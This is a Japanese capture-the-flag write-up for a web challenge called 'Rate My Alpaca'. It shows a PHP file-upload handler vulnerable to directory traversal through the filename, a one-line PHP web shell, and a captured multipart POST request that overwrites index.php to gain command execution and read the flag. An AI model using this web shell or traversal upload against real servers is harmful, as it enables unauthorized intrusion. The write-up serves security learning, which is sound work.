# Rate My Alpaca

## / Overview

アップロード機能を利用したindex.phpの書き換え->RCE

## / Writeup

目標はサーバーの`/flag-xxxx.txt`の内容を読むことです．

チャレンジサーバーをスポーンさせると任意のファイルをアップロードできるWebサイトにアクセスできます．

アップロードの仕組みはPHPで実装されています．

```php
$message = '';

if (isset($_FILES['file'])) {
    $filename = $_FILES['file']['full_path'];
    $uploaddir = '/var/www/uploads/';
    $uploadfile = $uploaddir . $filename;
    $uploadurl = '/uploads/' . $filename;
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);

    $message = "File uploaded to <a href=\"" . $uploadurl . "\">" . $uploadurl . "</a>. Please wait 15~20 business days until we rate your alpaca image.";
}
```

`$uploadfile`に実際のアプロード先のパスが格納されるのですが，`/var/www/uploads/`とファイル名を単に文字列で結合しているため，**ファイル名を使ってディレクトリトラバーサル**ができそうです．例えばファイル名を`../../../etc/passwd`とすれば結合後のパスは`/var/www/uploads/../../../etc/passwd`となります．

### index.phpの書き換え

PHPにはコマンドを実行できる関数が用意されており，クエリストリングからコマンドを受け取る場合次のように記述できます．

```php
<?php system($_GET['cmd']); ?>
```

これを`attack.php`として保存し，現在のWebページのソースコードである`index.php`の場所にアップロードすることで内容を上書きすれば，RCEができそうです．

後はアップロードするだけなのですが，ここで1つ問題があります．`Dockerfile`を見ると`/var/www/html/index.php`がアップロード先なので，ファイル名は`../html/index.php`にしたいです．しかしファイル名に`/`は使えません．これを解決するために**アップロードする時にPOSTリクエストヘッダを書き換え**ます．POSTリクエストをキャプチャすると次のような構造であることが分かります．

```http
POST / HTTP/1.1
Host: 34.170.146.252:51372
Content-Length: 228
Cache-Control: max-age=0
Accept-Language: ja
Origin: http://34.170.146.252:51372
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIP9a0sKibA9rLrXB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.170.146.252:51372/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryIP9a0sKibA9rLrXB
Content-Disposition: form-data; name="file"; filename="attack.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryIP9a0sKibA9rLrXB--
```

この`attack.php`を`../html/index.php`に書き換えることで，ファイル名を意図した通りに変更することが可能となります．これでWebサイトのソースコードを書き換えられるようになりました．送信することが出来たらURLの後ろに`?cmd=whoami`をつけてリロードしてみてください．コマンドが実行され現在のユーザーが表示されます．

これを`?cmd=<任意のコマンド>`とすることができるので，例えば`?cmd=cat /flag-*`とすることでフラグを取得することができます．
